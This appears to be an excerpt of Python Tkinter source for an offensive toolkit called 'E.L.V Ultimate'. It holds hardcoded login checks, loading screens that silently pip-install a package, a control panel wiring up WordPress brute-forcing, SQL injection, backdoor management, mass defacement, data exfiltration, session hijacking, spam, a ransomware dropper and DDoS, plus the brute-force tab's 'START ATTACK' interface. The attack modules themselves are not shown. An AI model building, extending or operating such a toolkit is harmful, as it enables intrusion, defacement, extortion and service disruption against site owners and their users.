        tk.Label(login_window, text='Username:', font=('Courier', 10), fg=CYAN_NEON, bg=BG_DARK).pack(pady=5)
        username_entry = tk.Entry(login_window, font=('Courier', 10), bg=BG_DARK, fg=CYAN_NEON, insertbackground=CYAN_NEON, width=25)
        username_entry.pack(pady=5)
        username_entry.focus()
        tk.Label(login_window, text='Password:', font=('Courier', 10), fg=CYAN_NEON, bg=BG_DARK).pack(pady=5)
        password_entry = tk.Entry(login_window, font=('Courier', 10), bg=BG_DARK, fg=CYAN_NEON, insertbackground=CYAN_NEON, show='*', width=25)
        password_entry.pack(pady=5)
        status_label = tk.Label(login_window, text='', font=('Courier', 9), fg=CYAN_NEON, bg=BG_DARK)
        status_label.pack(pady=5)
        login_result = {'success': False}

        def try_login():
            username = username_entry.get().strip()
            password = password_entry.get().strip()
            if username == 'N0N4ME@ELV' and password == 'N0N4M3@ELV123':
                login_result['success'] = True
                login_window.destroy()
            else:
                status_label.config(text='Invalid credentials!')
                password_entry.delete(0, tk.END)

        def on_enter(event):
            try_login()
        password_entry.bind('<Return>', on_enter)
        login_button = tk.Button(login_window, text='LOGIN', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=CYAN_NEON, activebackground=CYAN_NEON, activeforeground=CYAN_NEON, command=try_login, width=15, height=2)
        login_button.pack(pady=15)
        login_window.wait_window()
        if not login_result['success']:
            self.root.destroy()
            return False
        return True

    def show_loading_screen(self):
        loading_window = tk.Toplevel(self.root)
        loading_window.title('E.L.V ENGINE - Initializing')
        loading_window.geometry('800x500')
        loading_window.configure(bg=BG_DARK)
        loading_window.resizable(False, False)
        loading_window.transient(self.root)
        loading_window.grab_set()
        loading_window.overrideredirect(True)
        loading_window.update_idletasks()
        x = loading_window.winfo_screenwidth() // 2 - 800 // 2
        y = loading_window.winfo_screenheight() // 2 - 500 // 2
        loading_window.geometry(f'800x500+{x}+{y}')
        title_label = tk.Label(loading_window, text='ELV ULTIMATE', font=('Courier', 32, 'bold'), fg=CYAN_NEON, bg=BG_DARK)
        title_label.pack(pady=50)
        status_label = tk.Label(loading_window, text='Initializing system...', font=('Courier', 14), fg=CYAN_NEON, bg=BG_DARK)
        status_label.pack(pady=20)
        progress_label = tk.Label(loading_window, text='', font=('Courier', 10), fg=CYAN_NEON, bg=BG_DARK)
        progress_label.pack(pady=10)
        messages = [('Initializing system...', 1), ('Installing packages...', 2), ('Setup system...', 2), ('Loading modules...', 1), ('System ready!', 1)]
        package_installed = [False]
        current_index = [0]

        def update_loading():
            if current_index[0] < len(messages):
                msg, delay = messages[current_index[0]]
                status_label.config(text=msg)
                if msg == 'Installing packages...' and (not package_installed[0]):

                    def install_package():
                        try:
                            subprocess.run(['pip', 'install', 'pyttsx3', '--break-system-packages'], capture_output=True, timeout=10)
                            package_installed[0] = True
                        except:
                            package_installed[0] = True
                    threading.Thread(target=install_package, daemon=True).start()
                    loading_window.after(int(delay * 1000), update_loading)
                else:
                    current_index[0] += 1
                    loading_window.after(int(delay * 1000), update_loading)
            else:

                def play_voice():
                    try:
                        if TTS_AVAILABLE or package_installed[0]:
                            try:
                                engine = pyttsx3.init()
                                engine.setProperty('rate', 150)
                                engine.say('SYSTEM IS ONLINE, WELCOME TO E.L.V PROTECT ENGINE')
                                engine.runAndWait()
                                engine.stop()
                            except:
                                try:
                                    if platform.system() == 'Linux':
                                        subprocess.Popen(['espeak', '-s', '150', 'RUNINNG CODE WITH MAGIC & PHYSICS, WITH E.L.V ULTIMATE'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                    elif platform.system() == 'E.L.V':
                                        subprocess.Popen(['say', 'SYSTEM IS ONLINE, WELCOME TO OTHER CODE DIMENSIONAL'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                    elif platform.system() == 'Windows':
                                        try:
                                            import win32com.client
                                            speaker = win32com.client.Dispatch('SAPI.SpVoice')
                                            speaker.Speak('SYSTEM IS ONLINE, WELCOME TO E.L.V ULTIMATE ENGINE')
                                        except:
                                            pass
                                except:
                                    pass
                    except:
                        pass
                threading.Thread(target=play_voice, daemon=True).start()
                loading_window.after(2000, loading_window.destroy)
        loading_window.after(100, update_loading)
        loading_window.wait_window()

    def open_generate_password(self):
        self.show_tab('Generate Password', GeneratePasswordTab)

    def open_wp_brute(self):
        self.show_tab('WP Brute', WPBruteTab)

    def open_dork_scanner(self):
        self.show_tab('Dork Scanner', DorkScannerTab)

    def open_sqli_exploit(self):
        self.show_tab('SQLi Exploit', SQLiExploitTab)

    def open_param_finder(self):
        self.show_tab('Param Finder', ParamFinderTab)

    def open_subdomain_finder(self):
        self.show_tab('Subdomain Finder', SubdomainFinderTab)

    def open_url_filter(self):
        self.show_tab('URL Filter', URLFilterTab)

    def open_web_vuln_checker(self):
        self.show_tab('Web Vuln Checker', WebVulnCheckerTab)

    def open_cve_exploiter(self):
        self.show_tab('CVE WP Exploiter', CVEExploiterTab)

    def open_backdoor_manager(self):
        self.show_tab('Backdoor Manager', BackdoorManagerTab)

    def open_mass_deface(self):
        self.show_tab('Mass Deface', MassDefaceTab)

    def open_advanced_recon(self):
        self.show_tab('Advanced Recon', AdvancedReconTab)

    def open_proxy_rotator(self):
        self.show_tab('Proxy Rotator', ProxyRotatorTab)

    def open_data_exfiltration(self):
        self.show_tab('Data Exfiltration', DataExfiltrationTab)

    def open_session_hijacking(self):
        self.show_tab('Session Hijacking', SessionHijackingTab)

    def open_email_spamming(self):
        self.show_tab('Email Spamming', EmailSpammingTab)

    def open_ransomware_dropper(self):
        self.show_tab('Ransomware Dropper', RansomwareDropperTab)

    def open_ddos_attack(self):
        self.show_tab('DDoS Attack', DDoSAttackTab)

    def show_tab(self, tab_name, tab_class):
        for widget in self.root.winfo_children():
            if isinstance(widget, tk.Frame) and widget != self.root:
                widget.pack_forget()
        if self.current_tab:
            self.current_tab.pack_forget()
        if tab_name not in self.tabs:
            self.tabs[tab_name] = tab_class(self.root, self.colors, control_panel=self)
        self.current_tab = self.tabs[tab_name]
        self.current_tab.pack(fill=tk.BOTH, expand=True)
        self.root.title('⚡ ELV-ULTIMATE — CYBERPUNK NEON 2077 ⚡')

    def setup_control_panel(self):
        for widget in self.root.winfo_children():
            widget.pack_forget()
        title_frame = tk.Frame(self.root, bg=BG_DARK)
        title_frame.pack(fill=tk.X, pady=20)
        title_label = tk.Label(title_frame, text='E.L.V ENGINE', font=('Courier', 36, 'bold'), fg=CYAN_NEON, bg=BG_DARK)
        title_label.pack()
        subtitle_label = tk.Label(title_frame, text='CONTROL PANEL', font=('Courier', 14), fg=CYAN_NEON, bg=BG_DARK)
        subtitle_label.pack(pady=5)
        buttons_frame = tk.Frame(self.root, bg=BG_DARK)
        buttons_frame.pack(fill=tk.BOTH, expand=True, padx=30, pady=20)
        buttons = [('Generate Password', self.open_generate_password), ('WP Brute', self.open_wp_brute), ('Dork Scanner', self.open_dork_scanner), ('SQLi Exploit', self.open_sqli_exploit), ('Param Finder', self.open_param_finder), ('Subdomain Finder', self.open_subdomain_finder), ('URL Filter', self.open_url_filter), ('Web Vuln Checker', self.open_web_vuln_checker), ('CVE WP Exploiter', self.open_cve_exploiter), ('Backdoor Manager', self.open_backdoor_manager), ('Mass Deface', self.open_mass_deface), ('Advanced Recon', self.open_advanced_recon), ('Proxy Rotator', self.open_proxy_rotator), ('Data Exfiltration', self.open_data_exfiltration), ('Session Hijacking', self.open_session_hijacking), ('Email Spamming', self.open_email_spamming), ('Ransomware Dropper', self.open_ransomware_dropper), ('DDoS Attack', self.open_ddos_attack)]
        rows = 3
        cols = 3
        for idx, (text, command) in enumerate(buttons):
            row = idx // cols
            col = idx % cols
            btn = tk.Button(buttons_frame, text=text, font=('Courier', 14, 'bold'), bg=BG_DARK, fg=CYAN_NEON, activebackground=CYAN_NEON, activeforeground=CYAN_NEON, command=command, width=25, height=4, relief=tk.RAISED, borderwidth=2, cursor='hand2')
            btn.grid(row=row, column=col, padx=15, pady=15, sticky='nsew')
        for i in range(rows):
            buttons_frame.grid_rowconfigure(i, weight=1)
        for i in range(cols):
            buttons_frame.grid_columnconfigure(i, weight=1)

    def on_closing(self):
        if messagebox.askokcancel('Quit', 'Do you want to quit?'):
            try:
                for tab_name, tab in self.tabs.items():
                    if hasattr(tab, 'stop_flag'):
                        tab.stop_flag = True
                    if hasattr(tab, 'is_running'):
                        tab.is_running = False
                    if hasattr(tab, 'stop_scan'):
                        try:
                            tab.stop_scan()
                        except:
                            pass
                    if hasattr(tab, 'stop_bruteforce'):
                        try:
                            tab.stop_bruteforce()
                        except:
                            pass
            except:
                pass
            import threading
            import time
            time.sleep(0.1)
            self.root.quit()
            self.root.destroy()
            import os
            os._exit(0)

class ELVMODEGUI:
    """E.L.V MODE GUI - Ultimate Hacker Interface"""

    def __init__(self, root):
        self.root = root
        self.root.title('⚡ ELV-ULTIMATE — CYBERPUNK NEON 2077 ⚡')
        self.root.geometry('1200x750')
        self.root.minsize(900, 600)
        self.root.configure(bg=BG_DARK)
        self.colors = {'bg': '#000000', 'fg': '#00ff41', 'fg_cyan': '#00ffff', 'fg_yellow': '#ffff00', 'fg_red': '#ff0040', 'fg_green': '#00ff41', 'fg_purple': '#ff00ff', 'generated_passwords_file': None, 'entry_bg': '#0a0a0a', 'entry_fg': '#00ff41', 'button_bg': '#0d0d0d', 'button_fg': '#00ff41', 'select_bg': '#1a1a1a', 'text_bg': '#000000', 'border': '#00ff41', 'glow': '#00ff41'}
        self.engine = None
        self.is_running = False
        self.stop_flag = False
        self.results = []
        self.stats = {'total': 0, 'processed': 0, 'success': 0, 'failed': 0, 'skipped': 0}
        self.log_queue = queue.Queue()
        self.stats_queue = queue.Queue()
        self.stats_lock = threading.Lock()
        if not self.check_login():
            return
        self.show_loading_screen()
        self.setup_gui()
        self.root.protocol('WM_DELETE_WINDOW', self.on_closing)
        self.process_log_queue()
        self.process_stats_queue()

    def check_login(self):
        login_window = tk.Toplevel(self.root)
        login_window.title('E.L.V ULTIMATE - Login')
        login_window.geometry('400x250')
        login_window.update_idletasks()
        x = login_window.winfo_screenwidth() // 2 - 400 // 2
        y = login_window.winfo_screenheight() // 2 - 250 // 2
        login_window.geometry(f'400x250+{x}+{y}')
        title_label = tk.Label(login_window, text='E.L.V EXPLOIT ZERO', font=('Courier', 20, 'bold'))
        title_label.pack(pady=20)
        tk.Label(login_window, text='Username:', font=('Courier', 10), fg=CYAN_NEON, bg=BG_DARK).pack(pady=5)
        username_entry = tk.Entry(login_window, font=('Courier', 10), bg=BG_DARK, fg=CYAN_NEON, insertbackground=CYAN_NEON, width=25)
        username_entry.pack(pady=5)
        username_entry.focus()
        tk.Label(login_window, text='Password:', font=('Courier', 10), fg=CYAN_NEON, bg=BG_DARK).pack(pady=5)
        password_entry = tk.Entry(login_window, font=('Courier', 10), bg=BG_DARK, fg=CYAN_NEON, insertbackground=CYAN_NEON, show='*', width=25)
        password_entry.pack(pady=5)
        status_label = tk.Label(login_window, text='', font=('Courier', 9), fg=CYAN_NEON, bg=BG_DARK)
        status_label.pack(pady=5)
        login_result = {'success': False}

        def try_login():
            username = username_entry.get().strip()
            password = password_entry.get().strip()
            if username == 'NONAME@ELV' and password == 'NONAME@ELV123':
                login_result['success'] = True
                login_window.destroy()
            else:
                status_label.config(text='Invalid credentials!')
                password_entry.delete(0, tk.END)

        def on_enter(event):
            try_login()
        password_entry.bind('<Return>', on_enter)
        login_button = tk.Button(login_window, text='LOGIN', font=('Courier', 10, 'bold'), bg=BG_DARK, fg=CYAN_NEON, activebackground=CYAN_NEON, activeforeground=CYAN_NEON, command=try_login, width=15, height=2)
        login_button.pack(pady=15)
        login_window.wait_window()
        if not login_result['success']:
            self.root.destroy()
            return False
        return True

    def show_loading_screen(self):
        loading_window = tk.Toplevel(self.root)
        loading_window.title('E.L.V READY - Initializing')
        loading_window.geometry('800x500')
        loading_window.configure(bg=BG_DARK)
        loading_window.resizable(False, False)
        loading_window.transient(self.root)
        loading_window.grab_set()
        loading_window.overrideredirect(True)
        loading_window.update_idletasks()
        x = loading_window.winfo_screenwidth() // 2 - 800 // 2
        y = loading_window.winfo_screenheight() // 2 - 500 // 2
        loading_window.geometry(f'800x500+{x}+{y}')
        title_label = tk.Label(loading_window, text='E.L.V ULTIMATE', font=('Courier', 20, 'bold'))
        title_label.pack(pady=(50, 30))
        status_label = tk.Label(loading_window, text='', font=('Courier', 14), fg=CYAN_NEON, bg=BG_DARK)
        status_label.pack(pady=20)
        progress_label = tk.Label(loading_window, text='', font=('Courier', 10), fg=CYAN_NEON, bg=BG_DARK)
        progress_label.pack(pady=10)
        loading_messages = ['Initializing system...', 'Loading core modules...', 'Installing packages...', 'Setting up network protocols...', 'Configuring brute force engine...', 'Preparing attack vectors...', 'Loading wordlist database...', 'Initializing dork scanner...', 'Setting up encryption layer...', 'Finalizing system configuration...', 'System ready...']
        current_index = [0]
        package_installed = [False]

        def update_loading():
            if current_index[0] < len(loading_messages):
                msg = loading_messages[current_index[0]]
                status_label.config(text=msg)
                progress = int((current_index[0] + 1) / len(loading_messages) * 100)
                progress_text = '[' + '=' * (progress // 2) + ' ' * (50 - progress // 2) + f'] {progress}%'
                progress_label.config(text=progress_text)
                if msg == 'Installing packages...' and (not package_installed[0]):

                    def install_package():
                        try:
                            import sys
                            try:
                                import pyttsx3
                                test_engine = pyttsx3.init()
                                test_engine.stop()
                            except:
                                try:
                                    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyttsx3', '--break-system-packages'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
                                except:
                                    pass
                            package_installed[0] = True
                        except:
                            package_installed[0] = True
                    install_thread = threading.Thread(target=install_package, daemon=True)
                    install_thread.start()
                    loading_window.after(3000, lambda: (current_index.__setitem__(0, current_index[0] + 1), update_loading()))
                else:
                    current_index[0] += 1
                    loading_window.after(300, update_loading)
            else:
                status_label.config(text='SYSTEM IS ONLINE', fg=CYAN_NEON)
                progress_label.config(text='[==================================================] 100%', fg=CYAN_NEON)

                def play_voice():
                    time.sleep(0.5)
                    try:
                        tts_available_now = False
                        try:
                            import pyttsx3
                            test_engine = pyttsx3.init()
                            test_engine.stop()
                            tts_available_now = True
                        except:
                            pass
                        if tts_available_now:
                            try:
                                engine = pyttsx3.init()
                                engine.setProperty('rate', 140)
                                engine.setProperty('volume', 1.0)
                                try:
                                    voices = engine.getProperty('voices')
                                    if voices and len(voices) > 0:
                                        for voice in voices:
                                            if 'female' in voice.name.lower() or 'zira' in voice.name.lower() or 'samantha' in voice.name.lower():
                                                engine.setProperty('voice', voice.id)
                                                break
                                        if not engine.getProperty('voice'):
                                            engine.setProperty('voice', voices[0].id)
                                except:
                                    pass
                                engine.say('SYSTEM IS ONLINE. WELCOME TO E.L.V ULTIMATE ENGINE')
                                engine.runAndWait()
                            except Exception as e1:
                                print(f'pyttsx3 Error: {e1}')
                                try:
                                    if platform.system() == 'Linux':
                                        subprocess.Popen(['espeak', '-s', '150', '-v', 'en+f3', 'SYSTEM IS ONLINE. WELCOME TO OTHER CODE DIMENSIONAL'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                    elif platform.system() == 'Darwin':
                                        subprocess.Popen(['say', 'SYSTEM IS ONLINE. WELCOME TO OTHER DIMENSIONAL OF CODE'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                    elif platform.system() == 'Windows':
                                        try:
                                            import win32com.client
                                            speaker = win32com.client.Dispatch('SAPI.SpVoice')
                                            speaker.Speak('SYSTEM IS ONLINE. WELCOME TO E.L.V ULTIMATE ENGINE')
                                        except:
                                            os.system('powershell -Command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak(\'SYSTEM IS ONLINE. WELCOME TO OTHER CODE DIMENSIONAL\')"')
                                except Exception as e2:
                                    print(f'Fallback TTS Error: {e2}')
                        else:
                            try:
                                if platform.system() == 'Linux':
                                    subprocess.Popen(['espeak', '-s', '150', '-v', 'en+f3', 'SYSTEM IS ONLINE. WELCOME TO E.L.V ULTIMATE ENGINE'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                elif platform.system() == 'Darwin':
                                    subprocess.Popen(['say', 'SYSTEM IS ONLINE. WELCOME TO OTHER WORLD'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                                elif platform.system() == 'Windows':
                                    try:
                                        import win32com.client
                                        speaker = win32com.client.Dispatch('SAPI.SpVoice')
                                        speaker.Speak('SYSTEM IS ONLINE. WELCOME TO OTHER DIMENSION OF CODING')
                                    except:
                                        os.system('powershell -Command "Add-Type -AssemblyName System.Speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak(\'SYSTEM IS ONLINE. WELCOME TO E.L.V ULTIMATE CRACKER\')"')
                            except Exception as e2:
                                print(f'Fallback TTS Error: {e2}')
                    except Exception as e:
                        print(f'TTS Error: {e}')
                voice_thread = threading.Thread(target=play_voice, daemon=True)
                voice_thread.start()
                loading_window.after(2500, lambda: loading_window.destroy())
        update_loading()
        loading_window.wait_window()

    def on_closing(self):
        """Handle window close event - prevent freeze"""
        if self.is_running:
            self.stop_flag = True
            self.is_running = False
            self.root.after(100, self.root.destroy)
        else:
            self.root.destroy()

    def setup_gui(self):
        """Setup GUI components"""
        title_frame = tk.Frame(self.root, bg=self.colors['bg'])
        title_frame.pack(fill=tk.X, padx=15, pady=(10, 8))
        title_label = tk.Label(title_frame, text='NONAME@ELV', font=('Courier', 24, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        title_label.pack(pady=10)
        separator = tk.Frame(self.root, bg=self.colors['fg_cyan'], height=1)
        separator.pack(fill=tk.X, padx=15, pady=(0, 10))
        main_frame = tk.Frame(self.root, bg=self.colors['bg'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
        left_panel = tk.Frame(main_frame, bg=self.colors['bg'])
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=False, padx=(0, 10))
        right_panel = tk.Frame(main_frame, bg=self.colors['bg'])
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        self.setup_input_panel(left_panel)
        self.setup_output_panel(right_panel)
        self.setup_control_buttons(right_panel)

    def setup_input_panel(self, parent):
        """Setup input panel"""
        section_label = tk.Label(parent, text='CONFIGURATION', font=('Courier', 10, 'bold'), fg=self.colors['fg_cyan'], bg=self.colors['bg'])
        section_label.pack(anchor=tk.W, pady=(0, 15))
        target_label = tk.Label(parent, text='Target URL or File:', font=('Courier', 9), fg=self.colors['fg_green'], bg=self.colors['bg'])
        target_label.pack(anchor=tk.W, pady=(0, 3))
        target_frame = tk.Frame(parent, bg=self.colors['bg'])
        target_frame.pack(fill=tk.X, pady=(0, 12))
        self.target_entry = tk.Entry(target_frame, font=('Courier', 9), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(0, 5))
        browse_target_btn = tk.Button(target_frame, text='Browse', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], activebackground=self.colors['select_bg'], activeforeground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1, command=self.browse_target_file, width=8)
        browse_target_btn.pack(side=tk.RIGHT)
        username_label = tk.Label(parent, text='Username (auto from wp-json if empty):', font=('Courier', 8), fg=self.colors['fg_green'], bg=self.colors['bg'])
        username_label.pack(anchor=tk.W, pady=(0, 3))
        self.username_entry = tk.Entry(parent, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.username_entry.pack(fill=tk.X, pady=(0, 8), ipady=3)
        self.username_entry.insert(0, 'admin')
        password_label = tk.Label(parent, text='Password (leave empty for auto-generate):', font=('Courier', 8), fg=self.colors['fg_green'], bg=self.colors['bg'])
        password_label.pack(anchor=tk.W, pady=(0, 3))
        self.password_entry = tk.Entry(parent, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1, show='*')
        self.password_entry.pack(fill=tk.X, pady=(0, 8), ipady=3)
        wordlist_label = tk.Label(parent, text='Wordlist File (optional):', font=('Courier', 8), fg=self.colors['fg_green'], bg=self.colors['bg'])
        wordlist_label.pack(anchor=tk.W, pady=(0, 3))
        wordlist_frame = tk.Frame(parent, bg=self.colors['bg'])
        wordlist_frame.pack(fill=tk.X, pady=(0, 8))
        self.wordlist_entry = tk.Entry(wordlist_frame, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.wordlist_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(0, 5))
        browse_wordlist_btn = tk.Button(wordlist_frame, text='Browse', font=('Courier', 8), bg=self.colors['button_bg'], fg=self.colors['button_fg'], activebackground=self.colors['select_bg'], activeforeground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1, command=self.browse_wordlist, width=8)
        browse_wordlist_btn.pack(side=tk.RIGHT)
        proxy_label = tk.Label(parent, text='Proxy (optional, ex: http://proxy.com:8000):', font=('Courier', 8), fg=self.colors['fg_green'], bg=self.colors['bg'])
        proxy_label.pack(anchor=tk.W, pady=(0, 3))
        self.proxy_entry = tk.Entry(parent, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.proxy_entry.pack(fill=tk.X, pady=(0, 8), ipady=3)
        advanced_label = tk.Label(parent, text='[ADVANCED] Performance Tuning', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'])
        advanced_label.pack(anchor=tk.W, pady=(8, 10))
        threads_label = tk.Label(parent, text='Threads:', font=('Courier', 8), fg=self.colors['fg_green'], bg=self.colors['bg'])
        threads_label.pack(anchor=tk.W, pady=(0, 3))
        self.threads_entry = tk.Entry(parent, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.threads_entry.pack(fill=tk.X, pady=(0, 8), ipady=3)
        self.threads_entry.insert(0, '3')
        timeout_label = tk.Label(parent, text='Timeout (seconds):', font=('Courier', 8), fg=self.colors['fg_green'], bg=self.colors['bg'])
        timeout_label.pack(anchor=tk.W, pady=(0, 3))
        self.timeout_entry = tk.Entry(parent, font=('Courier', 8), bg=self.colors['entry_bg'], fg=self.colors['entry_fg'], insertbackground=self.colors['fg_green'], relief=tk.SOLID, borderwidth=1)
        self.timeout_entry.pack(fill=tk.X, pady=(0, 8), ipady=3)
        self.timeout_entry.insert(0, '10')
        self.debug_var = tk.BooleanVar()
        debug_check = tk.Checkbutton(parent, text='Enable Debug Mode', font=('Courier', 8), fg=self.colors['fg_yellow'], bg=self.colors['bg'], selectcolor=self.colors['entry_bg'], activebackground=self.colors['bg'], activeforeground=self.colors['fg_yellow'], variable=self.debug_var)
        debug_check.pack(anchor=tk.W, pady=(0, 5))
        info_frame = tk.Frame(parent, bg=self.colors['bg'])
        info_frame.pack(fill=tk.X, pady=(5, 0))
        info_label = tk.Label(info_frame, text='Note: Username auto-detect from wp-json. Password auto-generated.', font=('Courier', 7), fg=self.colors['fg_cyan'], bg=self.colors['bg'], justify=tk.LEFT, wraplength=320)
        info_label.pack(anchor=tk.W)

    def setup_output_panel(self, parent):
        """Setup output panel"""
        log_section_label = tk.Label(parent, text='[LIVE LOG] Real-Time Attack Monitor', font=('Courier', 9, 'bold'), fg=self.colors['fg_green'], bg=self.colors['bg'])
        log_section_label.pack(anchor=tk.W, pady=(0, 8))
        log_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        self.log_text = scrolledtext.ScrolledText(log_frame, font=('Courier', 8), bg=self.colors['text_bg'], fg=self.colors['fg_green'], insertbackground=self.colors['fg_green'], relief=tk.FLAT, borderwidth=0, wrap=tk.WORD, height=12, padx=5, pady=5)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.tag_config('green', foreground=self.colors['fg_green'])
        self.log_text.tag_config('cyan', foreground=self.colors['fg_cyan'])
        self.log_text.tag_config('yellow', foreground=self.colors['fg_yellow'])
        self.log_text.tag_config('red', foreground=self.colors['fg_red'])
        results_section_label = tk.Label(parent, text='[BREACH RESULTS] Successful Intrusions', font=('Courier', 9, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        results_section_label.pack(anchor=tk.W, pady=(0, 8))
        results_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=1)
        results_frame.pack(fill=tk.BOTH, expand=False, pady=(0, 10))
        self.results_text = scrolledtext.ScrolledText(results_frame, font=('Courier', 8), bg=self.colors['text_bg'], fg=self.colors['fg_green'], insertbackground=self.colors['fg_green'], relief=tk.FLAT, borderwidth=0, wrap=tk.WORD, height=5, padx=5, pady=5)
        self.results_text.pack(fill=tk.BOTH, expand=True)
        self.results_text.tag_config('green', foreground=self.colors['fg_green'])
        self.results_text.tag_config('cyan', foreground=self.colors['fg_cyan'])
        self.results_text.tag_config('yellow', foreground=self.colors['fg_yellow'])
        self.results_text.tag_config('red', foreground=self.colors['fg_red'])
        stats_frame = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=1)
        stats_frame.pack(fill=tk.X, pady=(0, 8))
        self.stats_label = tk.Label(stats_frame, text='[STATS] Total: 0 | Processed: 0 | Success: 0 | Failed: 0 | Skipped: 0', font=('Courier', 9, 'bold'), fg=self.colors['fg_yellow'], bg=self.colors['bg'], anchor=tk.W, padx=10, pady=6)
        self.stats_label.pack(fill=tk.X)
        self.progress_label = tk.Label(stats_frame, text='[STATUS] IDLE | [THREADS] 0 | [SPEED] 0 req/s', font=('Courier', 7), fg=self.colors['fg_cyan'], bg=self.colors['bg'], anchor=tk.W, padx=10, pady=5)
        self.progress_label.pack(fill=tk.X)

    def setup_control_buttons(self, parent):
        """Setup control buttons di panel kanan"""
        button_label = tk.Label(parent, text='[CONTROL PANEL]', font=('Courier', 9, 'bold'), fg=self.colors['fg_red'], bg=self.colors['bg'])
        button_label.pack(anchor=tk.W, pady=(0, 6))
        button_container = tk.Frame(parent, bg=self.colors['bg'], relief=tk.SOLID, borderwidth=2, highlightbackground=self.colors['fg_green'], highlightthickness=2)
        button_container.pack(fill=tk.X, pady=(0, 0))
        button_frame = tk.Frame(button_container, bg=self.colors['bg'])
        button_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.generate_button = tk.Button(button_frame, text='[++ GENERATE PASSWORDS]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_purple'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_purple'], relief=tk.RAISED, borderwidth=2, command=self.generate_passwords, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_purple'], highlightthickness=1)
        self.generate_button.grid(row=0, column=0, padx=(0, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.start_button = tk.Button(button_frame, text='[>> START ATTACK]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_green'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_green'], relief=tk.RAISED, borderwidth=2, command=self.start_bruteforce, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_green'], highlightthickness=1)
        self.start_button.grid(row=0, column=1, padx=(0, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.stop_button = tk.Button(button_frame, text='[<< STOP ATTACK]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_red'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_red'], relief=tk.RAISED, borderwidth=2, command=self.stop_bruteforce, width=18, height=2, state=tk.DISABLED, cursor='hand2', highlightbackground=self.colors['fg_red'], highlightthickness=1)
        self.stop_button.grid(row=0, column=2, padx=(0, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.clear_button = tk.Button(button_frame, text='[XX CLEAR LOG]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_yellow'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_yellow'], relief=tk.RAISED, borderwidth=2, command=self.clear_logs, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_yellow'], highlightthickness=1)
        self.clear_button.grid(row=1, column=0, padx=(0, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        self.save_button = tk.Button(button_frame, text='[$$ SAVE DATA]', font=('Courier', 8, 'bold'), bg=BG_DARK, fg=self.colors['fg_cyan'], activebackground=CYAN_NEON, activeforeground=self.colors['fg_cyan'], relief=tk.RAISED, borderwidth=2, command=self.save_results, width=18, height=2, cursor='hand2', highlightbackground=self.colors['fg_cyan'], highlightthickness=1)
        self.save_button.grid(row=1, column=1, padx=(0, 6), pady=6, sticky='ew', ipadx=6, ipady=4)
        button_frame.columnconfigure(0, weight=1, uniform='button')
        button_frame.columnconfigure(1, weight=1, uniform='button')
        button_frame.columnconfigure(2, weight=1, uniform='button')
